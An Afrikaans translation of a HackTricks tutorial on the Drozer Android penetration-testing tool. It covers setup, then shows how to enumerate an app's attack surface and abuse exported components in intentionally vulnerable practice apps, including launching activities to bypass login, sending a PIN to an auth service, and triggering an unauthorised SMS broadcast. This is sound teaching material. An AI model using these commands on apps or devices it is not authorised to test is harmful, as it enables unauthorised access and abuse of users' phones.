# Drozer Tutoriaal

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings te verdien tot **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## APKs om te toets

* [Sieve](https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk) (van mrwlabs)
* [DIVA](https://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz)

**Dele van hierdie tutoriaal is onttrek uit die** [**Drozer dokumentasie pdf**](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)**.**

## Installasie

Installeer Drozer Klient binne jou gasheer. Laai dit af van die [nuutste vrylatings](https://github.com/mwrlabs/drozer/releases).
```bash
pip install drozer-2.4.4-py2-none-any.whl
pip install twisted
pip install service_identity
```
Laai die drozer APK af van die [nuutste vrystellings](https://github.com/mwrlabs/drozer/releases). Op hierdie oomblik is dit [hierdie](https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk).
```bash
adb install drozer.apk
```
### Begin die Bediener

Die agent hardloop op poort 31415, ons moet [poort deurstuur](https://en.wikipedia.org/wiki/Port\_forwarding) om die kommunikasie tussen die Drozer-kli√´nt en agent te vestig, hier is die bevel om dit te doen:
```bash
adb forward tcp:31415 tcp:31415
```
Uiteindelik, **begin** die **toepassing** en druk op die onderste "**AAN**"

![](<../../../.gitbook/assets/image (456).png>) 

En verbind daarmee:
```bash
drozer console connect
```
## Interessante Opdragte

| **Opdragte**    | **Beskrywing**                                                                                                                                        |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Help MODULE** | Wys die hulp van die gekose module                                                                                                                      |
| **lys**         | Wys 'n lys van alle drozer-modules wat uitgevoer kan word in die huidige sessie. Dit verberg modules waarvoor jy nie die toepaslike regte het om uit te voer nie. |
| **shell**       | Begin 'n interaktiewe Linux-skoot op die toestel, in die konteks van die Agent.                                                                         |
| **skoon**       | Verwyder tydelike l√™ers wat deur drozer op die Android-toestel gestoor word.                                                                             |
| **laai**        | Laai 'n l√™er wat drozer-opdragte bevat en voer hulle in volgorde uit.                                                                                   |
| **module**      | Vind en installeer addisionele drozer-modules van die Internet.                                                                                          |
| **unset**       | Verwyder 'n benoemde veranderlike wat drozer aan enige Linux-skote wat dit aanroep, oordra.                                                              |
| **stel**        | Berg 'n waarde op in 'n veranderlike wat as 'n omgewingsveranderlike aan enige Linux-skote wat deur drozer aangeroep word, oorgedra sal word.             |
| **shell**       | Begin 'n interaktiewe Linux-skoot op die toestel, in die konteks van die Agent.                                                                          |
| **run MODULE**  | Voer 'n drozer-module uit                                                                                                                               |
| **exploit**     | Drozer kan exploits skep om op die toestel uit te voer. `drozer exploit list`                                                                            |
| **payload**     | Die exploits benodig 'n lading. `drozer payload list`                                                                                                    |

### Pakket

Vind die **naam** van die pakket deur te filter op 'n deel van die naam:
```bash
dz> run app.package.list -f sieve
com.mwr.example.sieve
```
**Basiese Inligting** van die pakket:
```bash
dz> run app.package.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Process Name: com.mwr.example.sieve
Version: 1.0
Data Directory: /data/data/com.mwr.example.sieve
APK Path: /data/app/com.mwr.example.sieve-2.apk
UID: 10056
GID: [1028, 1015, 3003]
Shared Libraries: null
Shared User ID: null
Uses Permissions:
- android.permission.READ_EXTERNAL_STORAGE
- android.permission.WRITE_EXTERNAL_STORAGE
- android.permission.INTERNET
Defines Permissions:
- com.mwr.example.sieve.READ_KEYS
- com.mwr.example.sieve.WRITE_KEYS
```
Lees **Manifest**:
```bash
run app.package.manifest jakhar.aseem.diva
```
**Aanvalsoppervlak** van die pakket:
```bash
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
3 activities exported
0 broadcast receivers exported
2 content providers exported
2 services exported
is debuggable
```
* **Aktiwiteite**: Dalk kan jy 'n aktiwiteit begin en 'n soort van magtiging omseil wat jou behoort te keer om dit te begin.
* **Inhoudsverskaffers**: Dalk kan jy toegang verkry tot private data of 'n kwesbaarheid uitbuit (SQL Injection of Padtraversal).
* **Dienste**:
* **is debuggable**: [Leer meer](./#is-debuggeable)

### Aktiwiteite

'n Uitgevoerde aktiwiteitskomponent se "android:exported" waarde is ingestel op **"waar"** in die AndroidManifest.xml-l√™er:
```markup
<activity android:name="com.my.app.Initial" android:exported="true">
</activity>
```
**Lys uitgevoerde aktiwiteite**:
```bash
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
com.mwr.example.sieve.FileSelectActivity
com.mwr.example.sieve.MainLoginActivity
com.mwr.example.sieve.PWList
```
**Begin aktiwiteit**:

Miskien kan jy 'n aktiwiteit begin en 'n soort van magtiging omseil wat jou behoort te keer om dit te begin.
```bash
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```
{% endcode %}

Jy kan ook 'n uitgevoerde aktiwiteit begin vanaf **adb**:

* PakketNaam is com.example.demo
* Uitgevoerde AktiwiteitNaam is com.example.test.MainActivity
```bash
adb shell am start -n com.example.demo/com.example.test.MainActivity
```
### Inhoudsverskaffers

Hierdie pos was te groot om hier te wees, so **jy kan** [**dit op sy eie bladsy hier besoek**](exploiting-content-providers.md).

### Dienste

'n Uitgevoerde diens word binne die Manifest.xml verklaar:
```markup
<service android:name=".AuthService" android:exported="true" android:process=":remote"/>
```
{% endcode %}

Binne die kode **soek** vir die \*\*`handleMessage`\*\*funksie wat die **boodskap** sal **ontvang**:

![](<../../../.gitbook/assets/image (79).png>)

#### Lysdiens
```bash
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
com.mwr.example.sieve.AuthService
Permission: null
com.mwr.example.sieve.CryptoService
Permission: null
```
#### **Interageer** met 'n diens
```bash
app.service.send            Send a Message to a service, and display the reply
app.service.start           Start Service
app.service.stop            Stop Service
```
#### Voorbeeld

Neem 'n kykie na die **drozer** hulp vir `app.service.send`:

![](<../../../.gitbook/assets/image (1076).png>)

Let daarop dat jy eers die data binne "_msg.what_" sal stuur, dan "_msg.arg1_" en "_msg.arg2_", jy moet binne die kode **ondersoek watter inligting gebruik word** en waar.\
Deur die `--extra` opsie te gebruik, kan jy iets stuur wat ge√Ønterpreteer word deur "_msg.replyTo"_, en deur `--bundle-as-obj` te gebruik, skep jy 'n objek met die verskafte besonderhede.

In die volgende voorbeeld:

* `what == 2354`
* `arg1 == 9234`
* `arg2 == 1`
* `replyTo == object(string com.mwr.example.sieve.PIN 1337)`
```bash
run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 1337 --bundle-as-obj
```
![](<../../../.gitbook/assets/image (644).png>)

### Uitsaai-Ontvangers

**In die Android basiese inligting afdeling kan jy sien wat 'n Uitsaai-Ontvanger is**.

Nadat jy hierdie Uitsaai-Ontvangers ontdek het, moet jy **die kode nagaan**. Gee spesiale aandag aan die **`onReceive`** funksie aangesien dit die ontvangste boodskappe sal hanteer.

#### **Ontdek alle** uitsaai-ontvangers
```bash
run app.broadcast.info #Detects all
```
#### Kontroleer uitsaai-ontvangers van 'n program
```bash
#Check one negative
run app.broadcast.info -a jakhar.aseem.diva
Package: jakhar.aseem.diva
No matching receivers.

# Check one positive
run app.broadcast.info -a com.google.android.youtube
Package: com.google.android.youtube
com.google.android.libraries.youtube.player.PlayerUiModule$LegacyMediaButtonIntentReceiver
Permission: null
com.google.android.apps.youtube.app.common.notification.GcmBroadcastReceiver
Permission: com.google.android.c2dm.permission.SEND
com.google.android.apps.youtube.app.PackageReplacedReceiver
Permission: null
com.google.android.libraries.youtube.account.AccountsChangedReceiver
Permission: null
com.google.android.apps.youtube.app.application.system.LocaleUpdatedReceiver
Permission: null
```
#### Uitsaai **Interaksies**
```bash
app.broadcast.info          Get information about broadcast receivers
app.broadcast.send          Send broadcast using an intent
app.broadcast.sniff         Register a broadcast receiver that can sniff particular intents
```
#### Stuur 'n boodskap

In hierdie voorbeeld van die misbruik van die [FourGoats apk](https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk) Inhoudverskaffer kan jy **'n willekeurige SMS stuur** na enige nie-premium bestemming **sonder om** die gebruiker om toestemming te vra.

![](<../../../.gitbook/assets/image (412).png>)

![](<../../../.gitbook/assets/image (570).png>)

As jy die kode lees, moet die parameters "_phoneNumber_" en "_message_" na die Inhoudverskaffer gestuur word.
```bash
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!"
```
### Is debuggeable

'n Produksie APK moet nooit debuggeable wees. Dit beteken dat jy 'n **java debugger kan koppel** aan die lopende aansoek, dit in tyd lopende kan inspekteer, breekpunte kan stel, stap vir stap kan gaan, veranderlike waardes kan versamel en selfs kan verander. [InfoSec-instituut het 'n uitstekende artikel](../exploiting-a-debuggeable-applciation.md) oor dieper delf wanneer jou aansoek debuggable is en inspuiting van tydverloopkode.

Wanneer 'n aansoek debuggable is, sal dit in die Manifes verskyn:
```xml
<application theme="@2131296387" debuggable="true"
```
Jy kan alle toepassings met foutopsporing vind met **Drozer**:
```bash
run app.package.debuggable
```
## Tutoriale

* [https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/#gref](https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/#gref)
* [https://github.com/mgcfish/mobiletools/blob/master/\_posts/2016-08-01-Using-Drozer-for-application-security-assessments.md](https://github.com/mgcfish/mobiletools/blob/master/\_posts/2016-08-01-Using-Drozer-for-application-security-assessments.md)
* [https://www.hackingarticles.in/android-penetration-testing-drozer/](https://www.hackingarticles.in/android-penetration-testing-drozer/)
* [https://medium.com/@ashrafrizvi3006/how-to-test-android-application-security-using-drozer-edc002c5dcac](https://medium.com/@ashrafrizvi3006/how-to-test-android-application-security-using-drozer-edc002c5dcac)

## Meer inligting

* [https://blog.dixitaditya.com/android-pentesting-cheatsheet/](https://blog.dixitaditya.com/android-pentesting-cheatsheet/)

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings tot **$100,000** te verdien!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
